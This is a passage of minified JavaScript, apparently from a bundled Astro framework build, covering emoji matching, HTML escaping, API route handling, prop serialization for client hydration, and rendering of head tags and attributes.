D83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD]))|\uD83E\uDDD1(?:\u200D(?:\uD83E\uDD1D\u200D\uD83E\uDDD1|\uD83C[\uDF3E\uDF73\uDF7C\uDF84\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFF\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF84\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFE\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF84\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFD\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF84\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFC\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF84\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD])|\uD83C\uDFFB\u200D(?:\uD83C[\uDF3E\uDF73\uDF7C\uDF84\uDF93\uDFA4\uDFA8\uDFEB\uDFED]|\uD83D[\uDCBB\uDCBC\uDD27\uDD2C\uDE80\uDE92]|\uD83E[\uDDAF-\uDDB3\uDDBC\uDDBD]))|\uD83D\uDC69\u200D\uD83D\uDC66\u200D\uD83D\uDC66|\uD83D\uDC69\u200D\uD83D\uDC69\u200D(?:\uD83D[\uDC66\uDC67])|\uD83D\uDC69\u200D\uD83D\uDC67\u200D(?:\uD83D[\uDC66\uDC67])|(?:\uD83D\uDC41\uFE0F\u200D\uD83D\uDDE8|\uD83E\uDDD1(?:\uD83C\uDFFF\u200D[\u2695\u2696\u2708]|\uD83C\uDFFE\u200D[\u2695\u2696\u2708]|\uD83C\uDFFD\u200D[\u2695\u2696\u2708]|\uD83C\uDFFC\u200D[\u2695\u2696\u2708]|\uD83C\uDFFB\u200D[\u2695\u2696\u2708]|\u200D[\u2695\u2696\u2708])|\uD83D\uDC69(?:\uD83C\uDFFF\u200D[\u2695\u2696\u2708]|\uD83C\uDFFE\u200D[\u2695\u2696\u2708]|\uD83C\uDFFD\u200D[\u2695\u2696\u2708]|\uD83C\uDFFC\u200D[\u2695\u2696\u2708]|\uD83C\uDFFB\u200D[\u2695\u2696\u2708]|\u200D[\u2695\u2696\u2708])|\uD83D\uDE36\u200D\uD83C\uDF2B|\uD83C\uDFF3\uFE0F\u200D\u26A7|\uD83D\uDC3B\u200D\u2744|(?:(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC70\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD35\uDD37-\uDD39\uDD3D\uDD3E\uDDB8\uDDB9\uDDCD-\uDDCF\uDDD4\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])|\uD83D\uDC6F|\uD83E[\uDD3C\uDDDE\uDDDF])\u200D[\u2640\u2642]|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uFE0F|\uD83C[\uDFFB-\uDFFF])\u200D[\u2640\u2642]|\uD83C\uDFF4\u200D\u2620|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC70\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD35\uDD37-\uDD39\uDD3D\uDD3E\uDDB8\uDDB9\uDDCD-\uDDCF\uDDD4\uDDD6-\uDDDD])\u200D[\u2640\u2642]|[\xA9\xAE\u203C\u2049\u2122\u2139\u2194-\u2199\u21A9\u21AA\u2328\u23CF\u23ED-\u23EF\u23F1\u23F2\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB\u25FC\u2600-\u2604\u260E\u2611\u2618\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638-\u263A\u2640\u2642\u265F\u2660\u2663\u2665\u2666\u2668\u267B\u267E\u2692\u2694-\u2697\u2699\u269B\u269C\u26A0\u26A7\u26B0\u26B1\u26C8\u26CF\u26D1\u26D3\u26E9\u26F0\u26F1\u26F4\u26F7\u26F8\u2702\u2708\u2709\u270F\u2712\u2714\u2716\u271D\u2721\u2733\u2734\u2744\u2747\u2763\u27A1\u2934\u2935\u2B05-\u2B07\u3030\u303D\u3297\u3299]|\uD83C[\uDD70\uDD71\uDD7E\uDD7F\uDE02\uDE37\uDF21\uDF24-\uDF2C\uDF36\uDF7D\uDF96\uDF97\uDF99-\uDF9B\uDF9E\uDF9F\uDFCD\uDFCE\uDFD4-\uDFDF\uDFF5\uDFF7]|\uD83D[\uDC3F\uDCFD\uDD49\uDD4A\uDD6F\uDD70\uDD73\uDD76-\uDD79\uDD87\uDD8A-\uDD8D\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA\uDECB\uDECD-\uDECF\uDEE0-\uDEE5\uDEE9\uDEF0\uDEF3])\uFE0F|\uD83C\uDFF3\uFE0F\u200D\uD83C\uDF08|\uD83D\uDC69\u200D\uD83D\uDC67|\uD83D\uDC69\u200D\uD83D\uDC66|\uD83D\uDE35\u200D\uD83D\uDCAB|\uD83D\uDE2E\u200D\uD83D\uDCA8|\uD83D\uDC15\u200D\uD83E\uDDBA|\uD83E\uDDD1(?:\uD83C\uDFFF|\uD83C\uDFFE|\uD83C\uDFFD|\uD83C\uDFFC|\uD83C\uDFFB)?|\uD83D\uDC69(?:\uD83C\uDFFF|\uD83C\uDFFE|\uD83C\uDFFD|\uD83C\uDFFC|\uD83C\uDFFB)?|\uD83C\uDDFD\uD83C\uDDF0|\uD83C\uDDF6\uD83C\uDDE6|\uD83C\uDDF4\uD83C\uDDF2|\uD83D\uDC08\u200D\u2B1B|\u2764\uFE0F\u200D(?:\uD83D\uDD25|\uD83E\uDE79)|\uD83D\uDC41\uFE0F|\uD83C\uDFF3\uFE0F|\uD83C\uDDFF(?:\uD83C[\uDDE6\uDDF2\uDDFC])|\uD83C\uDDFE(?:\uD83C[\uDDEA\uDDF9])|\uD83C\uDDFC(?:\uD83C[\uDDEB\uDDF8])|\uD83C\uDDFB(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDEE\uDDF3\uDDFA])|\uD83C\uDDFA(?:\uD83C[\uDDE6\uDDEC\uDDF2\uDDF3\uDDF8\uDDFE\uDDFF])|\uD83C\uDDF9(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDED\uDDEF-\uDDF4\uDDF7\uDDF9\uDDFB\uDDFC\uDDFF])|\uD83C\uDDF8(?:\uD83C[\uDDE6-\uDDEA\uDDEC-\uDDF4\uDDF7-\uDDF9\uDDFB\uDDFD-\uDDFF])|\uD83C\uDDF7(?:\uD83C[\uDDEA\uDDF4\uDDF8\uDDFA\uDDFC])|\uD83C\uDDF5(?:\uD83C[\uDDE6\uDDEA-\uDDED\uDDF0-\uDDF3\uDDF7-\uDDF9\uDDFC\uDDFE])|\uD83C\uDDF3(?:\uD83C[\uDDE6\uDDE8\uDDEA-\uDDEC\uDDEE\uDDF1\uDDF4\uDDF5\uDDF7\uDDFA\uDDFF])|\uD83C\uDDF2(?:\uD83C[\uDDE6\uDDE8-\uDDED\uDDF0-\uDDFF])|\uD83C\uDDF1(?:\uD83C[\uDDE6-\uDDE8\uDDEE\uDDF0\uDDF7-\uDDFB\uDDFE])|\uD83C\uDDF0(?:\uD83C[\uDDEA\uDDEC-\uDDEE\uDDF2\uDDF3\uDDF5\uDDF7\uDDFC\uDDFE\uDDFF])|\uD83C\uDDEF(?:\uD83C[\uDDEA\uDDF2\uDDF4\uDDF5])|\uD83C\uDDEE(?:\uD83C[\uDDE8-\uDDEA\uDDF1-\uDDF4\uDDF6-\uDDF9])|\uD83C\uDDED(?:\uD83C[\uDDF0\uDDF2\uDDF3\uDDF7\uDDF9\uDDFA])|\uD83C\uDDEC(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEE\uDDF1-\uDDF3\uDDF5-\uDDFA\uDDFC\uDDFE])|\uD83C\uDDEB(?:\uD83C[\uDDEE-\uDDF0\uDDF2\uDDF4\uDDF7])|\uD83C\uDDEA(?:\uD83C[\uDDE6\uDDE8\uDDEA\uDDEC\uDDED\uDDF7-\uDDFA])|\uD83C\uDDE9(?:\uD83C[\uDDEA\uDDEC\uDDEF\uDDF0\uDDF2\uDDF4\uDDFF])|\uD83C\uDDE8(?:\uD83C[\uDDE6\uDDE8\uDDE9\uDDEB-\uDDEE\uDDF0-\uDDF5\uDDF7\uDDFA-\uDDFF])|\uD83C\uDDE7(?:\uD83C[\uDDE6\uDDE7\uDDE9-\uDDEF\uDDF1-\uDDF4\uDDF6-\uDDF9\uDDFB\uDDFC\uDDFE\uDDFF])|\uD83C\uDDE6(?:\uD83C[\uDDE8-\uDDEC\uDDEE\uDDF1\uDDF2\uDDF4\uDDF6-\uDDFA\uDDFC\uDDFD\uDDFF])|[#\*0-9]\uFE0F\u20E3|\u2764\uFE0F|(?:\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC70\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD35\uDD37-\uDD39\uDD3D\uDD3E\uDDB8\uDDB9\uDDCD-\uDDCF\uDDD4\uDDD6-\uDDDD])(?:\uD83C[\uDFFB-\uDFFF])|(?:\u26F9|\uD83C[\uDFCB\uDFCC]|\uD83D\uDD75)(?:\uFE0F|\uD83C[\uDFFB-\uDFFF])|\uD83C\uDFF4|(?:[\u270A\u270B]|\uD83C[\uDF85\uDFC2\uDFC7]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66\uDC67\uDC6B-\uDC6D\uDC72\uDC74-\uDC76\uDC78\uDC7C\uDC83\uDC85\uDC8F\uDC91\uDCAA\uDD7A\uDD95\uDD96\uDE4C\uDE4F\uDEC0\uDECC]|\uD83E[\uDD0C\uDD0F\uDD18-\uDD1C\uDD1E\uDD1F\uDD30-\uDD34\uDD36\uDD77\uDDB5\uDDB6\uDDBB\uDDD2\uDDD3\uDDD5])(?:\uD83C[\uDFFB-\uDFFF])|(?:[\u261D\u270C\u270D]|\uD83D[\uDD74\uDD90])(?:\uFE0F|\uD83C[\uDFFB-\uDFFF])|[\u270A\u270B]|\uD83C[\uDF85\uDFC2\uDFC7]|\uD83D[\uDC08\uDC15\uDC3B\uDC42\uDC43\uDC46-\uDC50\uDC66\uDC67\uDC6B-\uDC6D\uDC72\uDC74-\uDC76\uDC78\uDC7C\uDC83\uDC85\uDC8F\uDC91\uDCAA\uDD7A\uDD95\uDD96\uDE2E\uDE35\uDE36\uDE4C\uDE4F\uDEC0\uDECC]|\uD83E[\uDD0C\uDD0F\uDD18-\uDD1C\uDD1E\uDD1F\uDD30-\uDD34\uDD36\uDD77\uDDB5\uDDB6\uDDBB\uDDD2\uDDD3\uDDD5]|\uD83C[\uDFC3\uDFC4\uDFCA]|\uD83D[\uDC6E\uDC70\uDC71\uDC73\uDC77\uDC81\uDC82\uDC86\uDC87\uDE45-\uDE47\uDE4B\uDE4D\uDE4E\uDEA3\uDEB4-\uDEB6]|\uD83E[\uDD26\uDD35\uDD37-\uDD39\uDD3D\uDD3E\uDDB8\uDDB9\uDDCD-\uDDCF\uDDD4\uDDD6-\uDDDD]|\uD83D\uDC6F|\uD83E[\uDD3C\uDDDE\uDDDF]|[\u231A\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u26C4\u26C5\u26CE\u26D4\u26EA\u26F2\u26F3\u26F5\u26FA\u26FD\u2705\u2728\u274C\u274E\u2753-\u2755\u2757\u2795-\u2797\u27B0\u27BF\u2B1B\u2B1C\u2B50\u2B55]|\uD83C[\uDC04\uDCCF\uDD8E\uDD91-\uDD9A\uDE01\uDE1A\uDE2F\uDE32-\uDE36\uDE38-\uDE3A\uDE50\uDE51\uDF00-\uDF20\uDF2D-\uDF35\uDF37-\uDF7C\uDF7E-\uDF84\uDF86-\uDF93\uDFA0-\uDFC1\uDFC5\uDFC6\uDFC8\uDFC9\uDFCF-\uDFD3\uDFE0-\uDFF0\uDFF8-\uDFFF]|\uD83D[\uDC00-\uDC07\uDC09-\uDC14\uDC16-\uDC3A\uDC3C-\uDC3E\uDC40\uDC44\uDC45\uDC51-\uDC65\uDC6A\uDC79-\uDC7B\uDC7D-\uDC80\uDC84\uDC88-\uDC8E\uDC90\uDC92-\uDCA9\uDCAB-\uDCFC\uDCFF-\uDD3D\uDD4B-\uDD4E\uDD50-\uDD67\uDDA4\uDDFB-\uDE2D\uDE2F-\uDE34\uDE37-\uDE44\uDE48-\uDE4A\uDE80-\uDEA2\uDEA4-\uDEB3\uDEB7-\uDEBF\uDEC1-\uDEC5\uDED0-\uDED2\uDED5-\uDED7\uDEEB\uDEEC\uDEF4-\uDEFC\uDFE0-\uDFEB]|\uD83E[\uDD0D\uDD0E\uDD10-\uDD17\uDD1D\uDD20-\uDD25\uDD27-\uDD2F\uDD3A\uDD3F-\uDD45\uDD47-\uDD76\uDD78\uDD7A-\uDDB4\uDDB7\uDDBA\uDDBC-\uDDCB\uDDD0\uDDE0-\uDDFF\uDE70-\uDE74\uDE78-\uDE7A\uDE80-\uDE86\uDE90-\uDEA8\uDEB0-\uDEB6\uDEC0-\uDEC2\uDED0-\uDED6]|(?:[\u231A\u231B\u23E9-\u23EC\u23F0\u23F3\u25FD\u25FE\u2614\u2615\u2648-\u2653\u267F\u2693\u26A1\u26AA\u26AB\u26BD\u26BE\u26C4\u26C5\u26CE\u26D4\u26EA\u26F2\u26F3\u26F5\u26FA\u26FD\u2705\u270A\u270B\u2728\u274C\u274E\u2753-\u2755\u2757\u2795-\u2797\u27B0\u27BF\u2B1B\u2B1C\u2B50\u2B55]|\uD83C[\uDC04\uDCCF\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE1A\uDE2F\uDE32-\uDE36\uDE38-\uDE3A\uDE50\uDE51\uDF00-\uDF20\uDF2D-\uDF35\uDF37-\uDF7C\uDF7E-\uDF93\uDFA0-\uDFCA\uDFCF-\uDFD3\uDFE0-\uDFF0\uDFF4\uDFF8-\uDFFF]|\uD83D[\uDC00-\uDC3E\uDC40\uDC42-\uDCFC\uDCFF-\uDD3D\uDD4B-\uDD4E\uDD50-\uDD67\uDD7A\uDD95\uDD96\uDDA4\uDDFB-\uDE4F\uDE80-\uDEC5\uDECC\uDED0-\uDED2\uDED5-\uDED7\uDEEB\uDEEC\uDEF4-\uDEFC\uDFE0-\uDFEB]|\uD83E[\uDD0C-\uDD3A\uDD3C-\uDD45\uDD47-\uDD78\uDD7A-\uDDCB\uDDCD-\uDDFF\uDE70-\uDE74\uDE78-\uDE7A\uDE80-\uDE86\uDE90-\uDEA8\uDEB0-\uDEB6\uDEC0-\uDEC2\uDED0-\uDED6])|(?:[#\*0-9\xA9\xAE\u203C\u2049\u2122\u2139\u2194-\u2199\u21A9\u21AA\u231A\u231B\u2328\u23CF\u23E9-\u23F3\u23F8-\u23FA\u24C2\u25AA\u25AB\u25B6\u25C0\u25FB-\u25FE\u2600-\u2604\u260E\u2611\u2614\u2615\u2618\u261D\u2620\u2622\u2623\u2626\u262A\u262E\u262F\u2638-\u263A\u2640\u2642\u2648-\u2653\u265F\u2660\u2663\u2665\u2666\u2668\u267B\u267E\u267F\u2692-\u2697\u2699\u269B\u269C\u26A0\u26A1\u26A7\u26AA\u26AB\u26B0\u26B1\u26BD\u26BE\u26C4\u26C5\u26C8\u26CE\u26CF\u26D1\u26D3\u26D4\u26E9\u26EA\u26F0-\u26F5\u26F7-\u26FA\u26FD\u2702\u2705\u2708-\u270D\u270F\u2712\u2714\u2716\u271D\u2721\u2728\u2733\u2734\u2744\u2747\u274C\u274E\u2753-\u2755\u2757\u2763\u2764\u2795-\u2797\u27A1\u27B0\u27BF\u2934\u2935\u2B05-\u2B07\u2B1B\u2B1C\u2B50\u2B55\u3030\u303D\u3297\u3299]|\uD83C[\uDC04\uDCCF\uDD70\uDD71\uDD7E\uDD7F\uDD8E\uDD91-\uDD9A\uDDE6-\uDDFF\uDE01\uDE02\uDE1A\uDE2F\uDE32-\uDE3A\uDE50\uDE51\uDF00-\uDF21\uDF24-\uDF93\uDF96\uDF97\uDF99-\uDF9B\uDF9E-\uDFF0\uDFF3-\uDFF5\uDFF7-\uDFFF]|\uD83D[\uDC00-\uDCFD\uDCFF-\uDD3D\uDD49-\uDD4E\uDD50-\uDD67\uDD6F\uDD70\uDD73-\uDD7A\uDD87\uDD8A-\uDD8D\uDD90\uDD95\uDD96\uDDA4\uDDA5\uDDA8\uDDB1\uDDB2\uDDBC\uDDC2-\uDDC4\uDDD1-\uDDD3\uDDDC-\uDDDE\uDDE1\uDDE3\uDDE8\uDDEF\uDDF3\uDDFA-\uDE4F\uDE80-\uDEC5\uDECB-\uDED2\uDED5-\uDED7\uDEE0-\uDEE5\uDEE9\uDEEB\uDEEC\uDEF0\uDEF3-\uDEFC\uDFE0-\uDFEB]|\uD83E[\uDD0C-\uDD3A\uDD3C-\uDD45\uDD47-\uDD78\uDD7A-\uDDCB\uDDCD-\uDDFF\uDE70-\uDE74\uDE78-\uDE7A\uDE80-\uDE86\uDE90-\uDEA8\uDEB0-\uDEB6\uDEC0-\uDEC2\uDED0-\uDED6])\uFE0F|(?:[\u261D\u26F9\u270A-\u270D]|\uD83C[\uDF85\uDFC2-\uDFC4\uDFC7\uDFCA-\uDFCC]|\uD83D[\uDC42\uDC43\uDC46-\uDC50\uDC66-\uDC78\uDC7C\uDC81-\uDC83\uDC85-\uDC87\uDC8F\uDC91\uDCAA\uDD74\uDD75\uDD7A\uDD90\uDD95\uDD96\uDE45-\uDE47\uDE4B-\uDE4F\uDEA3\uDEB4-\uDEB6\uDEC0\uDECC]|\uD83E[\uDD0C\uDD0F\uDD18-\uDD1F\uDD26\uDD30-\uDD39\uDD3C-\uDD3E\uDD77\uDDB5\uDDB6\uDDB8\uDDB9\uDDBB\uDDCD-\uDDCF\uDDD1-\uDDDD])/g}});var Es,Fs,q=F(()=>{Wn();Es=S(Tn(),1),Fs=S(In(),1)});var ks,Bs,Ws,Ps,Mn,K=F(()=>{({replace:ks}=""),Bs=/[&<>'"]/g,Ws={"&":"&amp;","<":"&lt;",">":"&gt;","'":"&#39;",'"':"&quot;"},Ps=e=>Ws[e],Mn=e=>ks.call(e,Bs,Ps)});function Ls(e){return e.replace(/\r\n|\r(?!\n)|\n/g,`
`)}function $s(e,n){if(!n||n.line===void 0||n.column===void 0)return"";let a=Ls(e).split(`
`).map(i=>i.replace(/\t/g,"  ")),t=[];for(let i=-2;i<=2;i++)a[n.line+i]&&t.push(n.line+i);let o=0;for(let i of t){let l=`> ${i}`;l.length>o&&(o=l.length)}let s="";for(let i of t){let l=i===n.line-1;s+=l?"> ":"  ",s+=`${i+1} | ${a[i]}
`,l&&(s+=`${Array.from({length:o}).join(" ")}  | ${Array.from({length:n.column}).join(" ")}^
`)}return s}function Hs(e){return!(e.length!==3||!e[0]||typeof e[0]!="object")}function ba(e,n,a){var t;let o=((t=n?.split("/").pop())==null?void 0:t.replace(".astro",""))??"",s=(...i)=>{if(!Hs(i))throw new D({...On,message:On.message(o)});return e(...i)};return Object.defineProperty(s,"name",{value:o,writable:!1}),s.isAstroComponentFactory=!0,s.moduleId=n,s.propagation=a,s}function _s(e){return ba(e.factory,e.moduleId,e.propagation)}function B(e,n,a){return typeof e=="function"?ba(e,n,a):_s(e)}function Os(){return n=>{if(typeof n=="string")throw new D({...Un,message:Un.message(JSON.stringify(n))});let a=[...Object.values(n)];if(a.length===0)throw new D({...Gn,message:Gn.message(JSON.stringify(n))});return Promise.all(a.map(t=>t()))}}function P(e){return{site:e?new URL(e):void 0,generator:`Astro v${wa}`,glob:Os()}}function Ns(e,n){if(e[n])return e[n];if(n==="delete"&&e.del)return e.del;if(e.all)return e.all}async function Kn(e,n,a){var t;let{request:o,params:s}=n,i=(t=o.method)==null?void 0:t.toLowerCase(),l=Ns(e,i);if(!a&&a===!1&&i&&i!=="get"&&console.warn(`
${i} requests are not available when building a static site. Update your config to \`output: 'server'\` or \`output: 'hybrid'\` with an \`export const prerender = false\` to handle ${i} requests.`),!l||typeof l!="function")return new Response(null,{status:404,headers:{"X-Astro-Response":"Not-Found"}});l.length>1&&console.warn(`
API routes with 2 arguments have been deprecated. Instead they take a single argument in the form of:

export function get({ params, request }) {
	//...
}

Update your code to remove this warning.`);let c=new Proxy(n,{get(u,r){return r in u?Reflect.get(u,r):r in s?(console.warn(`
API routes no longer pass params as the first argument. Instead an object containing a params property is provided in the form of:

export function get({ params }) {
	// ...
}

Update your code to remove this warning.`),Reflect.get(s,r)):void 0}});return l.call(e,c,o)}function xa(e){let n={};return a(e),Object.keys(n).join(" ");function a(t){t&&typeof t.forEach=="function"?t.forEach(a):t===Object(t)?Object.keys(t).forEach(o=>{t[o]&&a(o)}):(t=t===!1||t==null?"":String(t).trim(),t&&t.split(/\s+/).forEach(o=>{n[o]=!0}))}}function en(e){return!!e&&typeof e=="object"&&typeof e.then=="function"}async function*Mt(e){let n=e.getReader();try{for(;;){let{done:a,value:t}=await n.read();if(a)return;yield t}}finally{n.releaseLock()}}function Us(e){return Object.prototype.toString.call(e)==="[object HTMLString]"}function Gs(e){return new nt(e)}function Sa(e){return typeof e.getReader=="function"}async function*Vn(e){if(Sa(e))for await(let n of Mt(e))yield ge(n);else for await(let n of e)yield ge(n)}function*qs(e){for(let n of e)yield ge(n)}function ge(e){if(e&&typeof e=="object"){if(e instanceof Uint8Array)return Gs(e);if(e instanceof Response&&e.body){let n=e.body;return Vn(n)}else{if(typeof e.then=="function")return Promise.resolve(e).then(n=>ge(n));if(Symbol.iterator in e)return qs(e);if(Symbol.asyncIterator in e||Sa(e))return Vn(e)}}return A(e)}function Ft(e,n={},a=new WeakSet){if(a.has(e))throw new Error(`Cyclic reference detected while serializing props for <${n.displayName} client:${n.hydrate}>!

Cyclic references cannot be safely serialized for client-side usage. Please remove the cyclic reference.`);a.add(e);let t=e.map(o=>Ea(o,n,a));return a.delete(e),t}function Ca(e,n={},a=new WeakSet){if(a.has(e))throw new Error(`Cyclic reference detected while serializing props for <${n.displayName} client:${n.hydrate}>!

Cyclic references cannot be safely serialized for client-side usage. Please remove the cyclic reference.`);a.add(e);let t=Object.fromEntries(Object.entries(e).map(([o,s])=>[o,Ea(s,n,a)]));return a.delete(e),t}function Ea(e,n={},a=new WeakSet){switch(Object.prototype.toString.call(e)){case"[object Date]":return[V.Date,e.toISOString()];case"[object RegExp]":return[V.RegExp,e.source];case"[object Map]":return[V.Map,JSON.stringify(Ft(Array.from(e),n,a))];case"[object Set]":return[V.Set,JSON.stringify(Ft(Array.from(e),n,a))];case"[object BigInt]":return[V.BigInt,e.toString()];case"[object URL]":return[V.URL,e.toString()];case"[object Array]":return[V.JSON,JSON.stringify(Ft(e,n,a))];case"[object Uint8Array]":return[V.Uint8Array,JSON.stringify(Array.from(e))];case"[object Uint16Array]":return[V.Uint16Array,JSON.stringify(Array.from(e))];case"[object Uint32Array]":return[V.Uint32Array,JSON.stringify(Array.from(e))];default:return e!==null&&typeof e=="object"?[V.Value,Ca(e,n,a)]:e===void 0?[V.Value]:[V.Value,e]}}function Fa(e,n){return JSON.stringify(Ca(e,n))}function Vs(e,n){let a={isPage:!1,hydration:null,props:{}};for(let[t,o]of Object.entries(e))if(t.startsWith("server:")&&t==="server:root"&&(a.isPage=!0),t.startsWith("client:"))switch(a.hydration||(a.hydration={directive:"",value:"",componentUrl:"",componentExport:{value:""}}),t){case"client:component-path":{a.hydration.componentUrl=o;break}case"client:component-export":{a.hydration.componentExport.value=o;break}case"client:component-hydration":break;case"client:display-name":break;default:{if(a.hydration.directive=t.split(":")[1],a.hydration.value=o,!n.has(a.hydration.directive)){let s=Array.from(n.keys()).map(i=>`client:${i}`).join(", ");throw new Error(`Error: invalid hydration directive "${t}". Supported hydration methods: ${s}`)}if(a.hydration.directive==="media"&&typeof a.hydration.value!="string")throw new D(Ts);break}}else t==="class:list"?o&&(a.props[t.slice(0,-5)]=xa(o)):a.props[t]=o;for(let t of Object.getOwnPropertySymbols(e))a.props[t]=e[t];return a}async function Zs(e,n){let{renderer:a,result:t,astroId:o,props:s,attrs:i}=e,{hydrate:l,componentUrl:c,componentExport:u}=n;if(!u.value)throw new Error(`Unable to resolve a valid export for "${n.displayName}"! Please open an issue at https://astro.build/issues!`);let r={children:"",props:{uid:o}};if(i)for(let[m,E]of Object.entries(i))r.props[m]=Ie(E);r.props["component-url"]=await t.resolve(decodeURI(c)),a.clientEntrypoint&&(r.props["component-export"]=u.value,r.props["renderer-url"]=await t.resolve(decodeURI(a.clientEntrypoint)),r.props.props=Ie(Fa(s,n))),r.props.ssr="",r.props.client=l;let p=await t.resolve("astro:scripts/before-hydration.js");return p.length&&(r.props["before-hydration-url"]=p),r.props.opts=Ie(JSON.stringify({name:n.displayName,value:n.hydrateArgs||""})),Ks.forEach(m=>{s[m]&&(r.props[m]=s[m])}),r}function Js(e){let n=0;if(e.length===0)return n;for(let a=0;a<e.length;a++){let t=e.charCodeAt(a);n=(n<<5)-n+t,n=n&n}return n}function Ys(e){let n,a="",t=Js(e),o=t<0?"Z":"";for(t=Math.abs(t);t>=kt;)n=t%kt,t=Math.floor(t/kt),a=Rt[n]+a;return t>0&&(a=Rt[t]+a),o+a}function ka(e){return e==null?!1:e.isAstroComponentFactory===!0}function Qs(e,n){let a=n.propagation||"none";return n.moduleId&&e.componentMetadata.has(n.moduleId)&&a==="none"&&(a=e.componentMetadata.get(n.moduleId).propagation),a==="in-tree"||a==="self"}function tn(e){return typeof e=="object"&&!!e[Ba]}function Xs(e,n){return{[Ba]:!0,head:e,content:n}}function ni(e){return e._metadata.hasHydrationScript?!1:e._metadata.hasHydrationScript=!0}function ai(e,n){return e._metadata.hasDirectives.has(n)?!1:(e._metadata.hasDirectives.add(n),!0)}function Zn(e,n){let t=e.clientDirectives.get(n);if(!t)throw new Error(`Unknown directive: ${n}`);return t}function oi(e,n,a){switch(n){case"both":return`${ti}<script>${Zn(e,a)};${ei}<\/script>`;case"directive":return`<script>${Zn(e,a)}<\/script>`}return""}function ui(e){var n;let a="";for(let[t,o]of Object.entries(e))a+=`const ${ci(t)} = ${(n=JSON.stringify(o))==null?void 0:n.replace(/<\/script>/g,"\\x3C/script>")};
`;return A(a)}function Yn(e){return e.length===1?e[0]:`${e.slice(0,-1).join(", ")} or ${e[e.length-1]}`}function T(e,n,a=!0){if(e==null)return"";if(e===!1)return ii.test(n)||ri.test(n)?A(` ${n}="false"`):"";if(li.has(n))return console.warn(`[astro] The "${n}" directive cannot be applied dynamically at runtime. It will not be rendered as an attribute.

Make sure to use the static attribute syntax (\`${n}={value}\`) instead of the dynamic spread syntax (\`{...{ "${n}": value }}\`).`),"";if(n==="class:list"){let t=we(xa(e),a);return t===""?"":A(` ${n.slice(0,-5)}="${t}"`)}if(n==="style"&&!(e instanceof fe)){if(Array.isArray(e)&&e.length===2)return A(` ${n}="${we(`${Jn(e[0])};${e[1]}`,a)}"`);if(typeof e=="object")return A(` ${n}="${we(Jn(e),a)}"`)}return n==="className"?A(` class="${we(e,a)}"`):e===!0&&(n.startsWith("data-")||si.test(n))?A(` ${n}`):A(` ${n}="${we(e,a)}"`)}function jt(e,n=!0){let a="";for(let[t,o]of Object.entries(e))a+=T(o,t,n);return A(a)}function ce(e,{props:n,children:a=""},t=!0){let{lang:o,"data-astro-id":s,"define:vars":i,...l}=n;return i&&(e==="style"&&(delete l["is:global"],delete l["is:scoped"]),e==="script"&&(delete l.hoist,a=ui(i)+`
`+a)),(a==null||a=="")&&nn.test(e)?`<${e}${jt(l,t)} />`:`<${e}${jt(l,t)}>${a}</${e}>`}function Qn(e){e._metadata.hasRenderedHead=!0;let n=Array.from(e.styles).filter(Wt).map(s=>s.props.rel==="stylesheet"?ce("link",s):ce("style",s));e.styles.clear();let a=Array.from(e.scripts).filter(Wt).map(s=>ce("script",s,!1)),o=Array.from(e.links).filter(Wt).map(s=>ce("link",s,!1)).join(`
`)+n.join(`
`)+a.join(`
